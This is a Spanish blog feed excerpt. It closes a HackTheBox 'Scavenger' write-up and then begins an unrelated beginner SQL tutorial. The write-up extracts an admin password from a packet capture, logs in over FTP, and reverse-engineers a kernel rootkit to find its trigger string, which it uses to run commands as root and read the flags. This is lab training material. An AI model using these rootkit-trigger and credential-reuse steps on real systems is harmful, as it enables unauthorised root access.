&lt;p&gt;La nota nos da una pista.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat notes.txt
After checking the logs and the network capture, all points to that the attacker knows valid credentials and abused a recently discovered vuln to gain access to the server!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Analizando la captura con &lt;code&gt;tshark&lt;/code&gt; obtenemos una contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ tshark -r ib01c01_incident.pcap -Y &quot;http.request.method==POST&quot; -Tfields -e 'tcp.payload' | xxd -ps -r
Running as user &quot;root&quot; and group &quot;root&quot;. This could be dangerous.
POST /admin530o6uisg/index.php?rand=1544475115839 HTTP/1.1
Host: www.pwnhats.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://www.pwnhats.htb/admin530o6uisg/index.php?controller=AdminLogin&amp;amp;token=de267fd50b09d00b04cca76ff620b201
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
cache-control: no-cache
X-Requested-With: XMLHttpRequest
Content-Length: 195
ajax=1&amp;amp;token=&amp;amp;controller=AdminLogin&amp;amp;submitLogin=1&amp;amp;passwd=GetYouAH4t%21&amp;amp;email=pwnhats%40pwnhats.htb&amp;amp;redirect=http%3a//www.pwnhats.htb/admin530o6uisg/%26token%3de44d0ae2213d01986912abc63712a05bPOST /admin530o6uisg/index.php?controller=AdminCustomerThreads&amp;amp;token=8d8e4db864318da7655c7f2d8175815f HTTP/1.1
Host: www.pwnhats.htb
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si urldecodeamos la contraseña, obtemos que es equivalente a &lt;code&gt;GetYouAH4t!&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ php --interactive
Interactive mode enabled

php &amp;gt; echo urldecode(&quot;GetYouAH4t%21&quot;);
GetYouAH4t!
php &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como el propieatio de la captura era el usuario &lt;code&gt;ib01c01&lt;/code&gt; vamos a conectarnos con ese usuario haciendo uso de la credencial obtenida.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ftp 10.10.10.155
Connected to 10.10.10.155.
220 (vsFTPd 3.0.3)
Name (10.10.10.155:fmiracle): ib01c01
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-------    1 1001     1004           32 Jan 30  2019 access.txt
-rw-r--r--    1 1001     1004     68175351 Dec 07  2018 prestashop_1.7.4.4.zip
-rw-r-----    1 0        1004           33 Jun 24 00:10 user.txt
drwxr-xr-x   26 1001     1004         4096 Sep 01  2021 www
226 Directory send OK.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora proderemos a traernos y visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat user.txt
e8dd26ca8a139f83116a1744aa6d1826
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Si bien examinamos por encima el archivo &lt;code&gt;pcap&lt;/code&gt; con la ayuda de &lt;code&gt;tshark&lt;/code&gt;, vamos a volver a examinarlo esta vez mediante &lt;code&gt;wireshark&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Al abrirnos &lt;code&gt;wireshark&lt;/code&gt;, vemos que en el archivo pcap existen peticiones &lt;code&gt;GET&lt;/code&gt; a un archivo de nombre &lt;code&gt;root.c&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Scavenger/sca8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si seguimos el fujo tcp para tratar de ver el contenido, obsevamos todo el script en &lt;code&gt;C&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Scavenger/sca9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Dentro del script, vemos una cadena &lt;code&gt;Got r00t&lt;/code&gt;, que llama mucho la atención y podemos ponernos a pensar que se trata de un &lt;code&gt;rootkit&lt;/code&gt; y si tratamos de investigar esa cadena del script, vemos un articulo que nos confirma que se trata de un &lt;code&gt;rootkit&lt;/code&gt; y nos dice como podemos aprovecharnos de este.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485&quot;&gt;https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Basicamente lo que hace es cargar un modulo llamado &lt;code&gt;root.ko&lt;/code&gt; y al enviar la cadena &lt;code&gt;echo &quot;g0tR0ot&quot; &amp;gt; /dev/ttyR0; comando&lt;/code&gt;, esta lo ejecutara como &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Probamos a ejecutar la cadena, pero vemos que lo ejecutamos como nuestro usuario, y esto quiero pensar que es debido a que si bien el proceso de &lt;code&gt;rootkit&lt;/code&gt; es el mismo, la cadena debe de ser distinta.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ rlwrap python3 tty_over_http.py
echo &quot;g0tR0ot&quot; &amp;gt; /dev/ttyR0; whoami
&amp;gt; ib01c03
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Por ello necesitamos encontrar el &lt;code&gt;root.ko&lt;/code&gt; que en principio es el que carga el &lt;code&gt;rootkit&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Si nos volvemos a conectar como el usuario &lt;code&gt;ib01c01&lt;/code&gt;, y listamos los archivo ocultos vemos uno inusual &lt;code&gt;...&lt;/code&gt; y si ingresamos al directorio encontramos el &lt;code&gt;root.ko&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ftp 10.10.10.155
Connected to 10.10.10.155.
220 (vsFTPd 3.0.3)
Name (10.10.10.155:fmiracle): ib01c01
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwx------    4 1001     1004         4096 Sep 01  2021 .
drwxr-xr-x    8 0        0            4096 Dec 07  2018 ..
drwxr-xr-x    2 1001     1004         4096 Feb 02  2019 ...
lrwxrwxrwx    1 0        0               9 Sep 01  2021 .bash_history -&amp;gt; /dev/null
-rw-------    1 1001     1004           32 Jan 30  2019 access.txt
-rw-r--r--    1 1001     1004     68175351 Dec 07  2018 prestashop_1.7.4.4.zip
-rw-r-----    1 0        1004           33 Jun 24 00:10 user.txt
drwxr-xr-x   26 1001     1004         4096 Sep 01  2021 www
226 Directory send OK.
ftp&amp;gt; cd ...
250 Directory successfully changed.
ftp&amp;gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0          399400 Feb 02  2019 root.ko
226 Directory send OK.
ftp&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vamos a traernos el archivo y examinarlo con nuestra maquina con &lt;code&gt;radare2&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ftp&amp;gt; get root.ko
local: root.ko remote: root.ko
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for root.ko (399400 bytes).
226 Transfer complete.
399400 bytes received in 3.94 secs (98.9888 kB/s)
ftp&amp;gt; quit
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ radare2 root.ko
Warning: run r2 with -e bin.cache=true to fix relocations in disassembly
 -- give | and &amp;gt; a try piping and redirection
[0x08000070]&amp;gt; aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze all functions arguments/locals
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Finding and parsing C++ vtables (avrr)
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information (aanr)
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x08000070]&amp;gt; afl
0x08000070    1 8            sym.root_open
0x08000080    1 9            sym.root_read
0x08000090   11 359          sym.root_write
0x080001f7    7 292          sym.root_init
0x0800031b    1 82           sym.root_exit
[0x08000070]&amp;gt; s sym.root_write
[0x08000090]&amp;gt; pdf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Al examinarlo vemos que la cadena &lt;code&gt;g0tR0ot&lt;/code&gt; fue reemplaza por la cadena en dos partes &lt;code&gt;g3tPr1v&lt;/code&gt;, asi que vamos a probar mandando esta nueva cadena.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Scavenger/sca10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ rlwrap python3 tty_over_http.py
echo &quot;g3tPr1v&quot; &amp;gt; /dev/ttyR0; whoami
&amp;gt; root
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Esta vez vemos que el &lt;code&gt;rootkit&lt;/code&gt; si funciona, asi que ahora que tenemos privilegios como &lt;code&gt;root&lt;/code&gt; solo nos quedaria visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;echo &quot;g3tPr1v&quot; &amp;gt; /dev/ttyR0; cat /root/root.txt
&amp;gt; 8c1482a3a42eb925f6e2a6ed49535065
&lt;/code&gt;&lt;/pre&gt;

</description>
        <pubDate>Fri, 23 Jun 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Scavenger</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Scavenger</guid>
        
        <category>Domain Zone Transfer</category>
        
        <category>Sql inyection</category>
        
        <category>ftp enumaration</category>
        
        <category>Whois</category>
        
        <category>Pcap analysis</category>
        
        <category>rootkit</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Aprende SQL desde cero y dominalo como un experto</title>
        <description>&lt;p&gt;En esta ocasion hablaremos del lenguaje de programación mas utilizado del mundo, exacto me refiero a &lt;code&gt;SQL&lt;/code&gt;, realizaremos todo un curso completo desde cero y explicaremos todo lo necesario para que puedas dominarlo en su totalidad, asi que comenzemos ya que debes aprenderlo ahora mismo!.&lt;/p&gt;

&lt;h2 id=&quot;que-es-sql&quot;&gt;QUE ES SQL? &lt;a href=&quot;#que-es-sql&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Como mencionamos anteriormente &lt;code&gt;SQL&lt;/code&gt; es un lenguaje de programación, como?, si es un lenguaje de programación y nos sirve para almacenar y procesar información en una base de datos relacional.&lt;/p&gt;

&lt;p&gt;Pero que es una base de datos relaciona?&lt;/p&gt;

&lt;p&gt;Pues una base de datos relacional almacena información en forma de tabla, con filas y columnas que representan diferentes atributos de datos y las diversas relaciones entre los valores de datos.&lt;/p&gt;

&lt;h2 id=&quot;aprender-sql&quot;&gt;POR QUE DEBO APRENDER SQL? &lt;a href=&quot;#aprender-sql&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Es necesario aprenderlo ya que es un lenguaje de consulta popular que se usa con frecuencia en todos los tipos de aplicaciones. Los analistas y desarrolladores de datos aprenden y usan &lt;code&gt;SQL&lt;/code&gt; porque se integra bien con los diferentes lenguajes de programación.&lt;/p&gt;

&lt;h2 id=&quot;indice-y-estructura&quot;&gt;INDICE Y ESTRUCTURA&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#que-es-sql&quot;&gt;Que es SQL&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#aprender-sql&quot;&gt;Por que debo aprender SQL?&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#tipos-de-datos-sql&quot;&gt;Tipos de Bases de datos SQL &lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#instalación&quot;&gt;Instalación&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#crear-base-de-datos&quot;&gt;Crear Base de Datos - CREATE DATABASE&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#crear-tabla&quot;&gt;Crear Tabla - CREATE TABLE&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#campos&quot;&gt;Campos&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#registros&quot;&gt;Registros&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#valor-de-campo&quot;&gt;Valor de Campo&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#columnas&quot;&gt;Columnas&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#insertar-valores-en-tabla-insert-into&quot;&gt;Insertar Valores en Tabla - INSERT INTO&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#consultas-o-querys&quot;&gt;Consultas o Querys&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#instruccion-select&quot;&gt;Instrucción SELECT&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#modificar-tabla-alter-table&quot;&gt;Modificar Tabla - ALTER TABLE&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#renombrar-tabla&quot;&gt;Renombrar Tabla&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#renombrar-columna&quot;&gt;Renombrar Columna&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#agregar-columna&quot;&gt;Agregar Columna&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#eliminar-columna&quot;&gt;Eliminar Columna&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#instruccion-drop&quot;&gt;Instrucción DROP&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#eliminar-base-de-datos-drop-database&quot;&gt;Eliminar Base de Datos - DROP DATABASE&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#eliminar-tabla-drop-table&quot;&gt;Eliminar Tabla - DROP TABLE&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#identificadores&quot;&gt;Identificadores&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#claves-primarias-o-primary-keys&quot;&gt;Claves Primarias - PRIMARY KEYS&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#instruccion-delete&quot;&gt;Instrucción DELETE&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#claves-foraneas-o-foreign-keys&quot;&gt;Claves Foraneas - FOREIGN KEYS&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#clausula-as-o-alias&quot;&gt;Clausula AS o ALIAS&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#clausula-order-by&quot;&gt;Clausula ORDER BY&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#clausula-where&quot;&gt;Clausula WHERE&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#instruccion-update&quot;&gt;Instrucción UPDATE&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#operadores-en-sql&quot;&gt;Operadores en SQL&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#operadores-and-y-or&quot;&gt;Operadores AND Y OR&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#operador-and&quot;&gt;Operador AND&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#operador-or&quot;&gt;Operador OR&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#operador-not&quot;&gt;Operador NOT&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#operador-limit&quot;&gt;Operador LIMIT&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#operador-distinct&quot;&gt;Operador DISTINCT&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#operador-between&quot;&gt;Operador BETWEEN&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#operador-between&quot;&gt;Operador LIKE&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#operador-is-null-y-is-not-null&quot;&gt;Operador IS NULL y IS NOT NULL&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#operador-in-y-not-in&quot;&gt;Operador IN y NOT IN&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#comentarios-en-sql&quot;&gt;Comentario en SQL&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#comentar-una-linea&quot;&gt;Comentar una linea&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#comentar-varias-lineas&quot;&gt;Comentar varias lineas&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#funciones-de-agregacion&quot;&gt;Funciones de Agregación&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#funcion-sum&quot;&gt;Función SUM&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#funcion-count&quot;&gt;Función COUNT&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#funcion-min&quot;&gt;Sentencia MIN&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#funcion-max&quot;&gt;Sentencia MAX&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#funcion-avg&quot;&gt;Sentencia AVG&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#funcion-round&quot;&gt;Sentencia ROUND&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#clausula-group-by&quot;&gt;Clausula GROUP BY&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#clausula-having&quot;&gt;Clausula HAVING&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#subconsultas&quot;&gt;Subconsultas&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#joins&quot;&gt;JOINS&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#cross-join&quot;&gt;CROSS JOIN&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#inner-join&quot;&gt;INNER JOIN&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#left-join&quot;&gt;LEFT JOIN&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#right-join&quot;&gt;RIGHT JOIN&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#full-join&quot;&gt;FULL JOIN&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#clausula-union&quot;&gt;Clausula UNION&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#clausula-union-all&quot;&gt;Clausula UNION ALL&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#indices&quot;&gt;Indices&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#indices-ordinarios-index&quot;&gt;Indices Ordinarios - INDEX&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#indices-primarios-primary-keys&quot;&gt;Indices Primarios - Primary Keys&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#indices-unicos-unique-index&quot;&gt;Indices Unicos - UNIQUE INDEX&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#vistas&quot;&gt;Vistas&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#bloqueos&quot;&gt;Bloqueos&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#bloqueos-compartidos-shared-locks&quot;&gt;Bloqueos Compartidos - SHARED LOCKS&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#bloqueos-reservados-reserved-locks&quot;&gt;Bloqueos Reservados - RESERVED LOCKS&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#bloqueos-exclusivos-exclusive-locks&quot;&gt;Bloqueos Exclusivos - EXCLUSIVE LOCKS&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#transacciones-begin-transaction&quot;&gt;Transacciones - BEGIN TRANSACTION&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#procedimientos-almacenados&quot;&gt;Procedimientos Almancenados&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#sql-y-python&quot;&gt;SQL y Python&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#funciones-definidas-por-el-usuario&quot;&gt;Funciones Definidas por el Usuario - USER DEFINED FUNCTIONS&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;tipos-de-datos-sql&quot;&gt;TIPOS DE BASES DE DATOS SQL &lt;a href=&quot;#tipos-de-datos-sql&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Existen muchos tipos de gestores de bases de datos sql, pero afortunadamente, la mayoría son muy parecidos y la lógica es la misma. Tienen alguna que otra sentencia diferente, pero por lo general, aprender un tipo de SQL te permitirá manejar cualquiera de las otras.&lt;/p&gt;

&lt;p&gt;En este caso concreto para el curso usaremos &lt;code&gt;Sqlite&lt;/code&gt; ya que este es el gestor de uso mas comun y es compatible con muchos lenguajes de programación y ademas no tiene servidor de base da datos dedicado para poder ejecutarlo y esta integrado directamente con la aplicación lo que nos facilita su uso.&lt;/p&gt;

&lt;h2 id=&quot;instalación&quot;&gt;INSTALACIÓN &lt;a href=&quot;#instalación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;La instalación es super sencilla solo debemos ir a la pagina oficial de sqlite para ello aqui dejo el enlace:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.sqlite.org/download.html&quot;&gt;https://www.sqlite.org/download.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Para este caso ya que lo instalación lo hare en &lt;code&gt;windows&lt;/code&gt;, una vez estemos en el enlace debemos descargarnos el archivo de nombre &lt;code&gt;sqlite-tools-win32-x86-3420000.zip&lt;/code&gt;. Seguidamente lo descomprimimos y copiamos el contenido en una carpeta creada en la raiz de nuestro disco &lt;code&gt;C:&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Seguidamente lo que haremos sera ir a nuestro buscador y buscar &lt;code&gt;Editar las variables del Entorno del Sistema&lt;/code&gt; y se nos abrira la siguente ventana:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora debemos darle a &lt;code&gt;Variables de Entorno &amp;gt; Path &amp;gt; Editar &amp;gt; Nuevo&lt;/code&gt;  y pegaremos la ruta de nuestra carpeta donde descomprimimos los archivos y guardamos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Despues iremos al siguente enlace y descargemos &lt;code&gt;DB Browser for SQLite - Standard installer&lt;/code&gt;, dependiendo la version de windows que utilizamos &lt;code&gt;32 o 64 bits&lt;/code&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://sqlitebrowser.org/dl/&quot;&gt;https://sqlitebrowser.org/dl/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Finalmente solo debemos seguir los pasos simples de instalación:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;y ya tendriamos &lt;code&gt;sqlite&lt;/code&gt; listo para usarlo, damos click en el &lt;code&gt;dbBrowser&lt;/code&gt; y se nos abrira la ventana donde vamos a trabajar.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;crear-base-de-datos&quot;&gt;CREAR BASE DE DATOS - CREATE DATABASE &lt;a href=&quot;#crear-base-de-datos&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Para comenzar a crear nuestra primera base de datos en &lt;code&gt;sqlite&lt;/code&gt;, podemos hacerlo de dos maneras:&lt;/p&gt;

&lt;p&gt;La primera seria simplemente ejecutar la palabra reservada &lt;code&gt;CREATE DATABASE&lt;/code&gt; y seguidamente el nombre que queremos que tenga nuestra base de datos, en este caso &lt;code&gt;Alumnos&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;CREATE DATABASE Alumnos;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pero para reprensentarlo de una manera mas visible podemos hacerlo ejecutando en la opcion &lt;code&gt;New Database&lt;/code&gt; y le asignamos un nombre, en este caso valga la redundancia &lt;code&gt;Alumnos.db&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al darle en &lt;code&gt;Gudardar&lt;/code&gt;, automaticamente se nos abrira otra ventana, donde nos pide ingresar un campo de nombre &lt;code&gt;Table&lt;/code&gt;, para ello tenemos que primer tener en cuenta el concepto de &lt;code&gt;tabla&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;crear-tabla&quot;&gt;CREAR TABLA - CREATE TABLE &lt;a href=&quot;#crear-tabla&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Es una estructura de datos que se almancenan en &lt;code&gt;filas y columnas&lt;/code&gt; y estas obviamente deben de tener un nombre.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para poder crearlas debemos ejecutar la siguente consulta:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;CREATE TABLE &quot;Alumnos&quot; (

);
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;campos&quot;&gt;CAMPOS &lt;a href=&quot;#campos&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Las tablas a su vez tienen &lt;code&gt;campos&lt;/code&gt;, los cuales corresponden a los nombres de las columnas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;registros&quot;&gt;REGISTROS &lt;a href=&quot;#registros&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ademas de contener &lt;code&gt;campos&lt;/code&gt;, tambien contienen &lt;code&gt;registros&lt;/code&gt; que vendrian a ser cada una de las filas de las tablas.&lt;/p&gt;

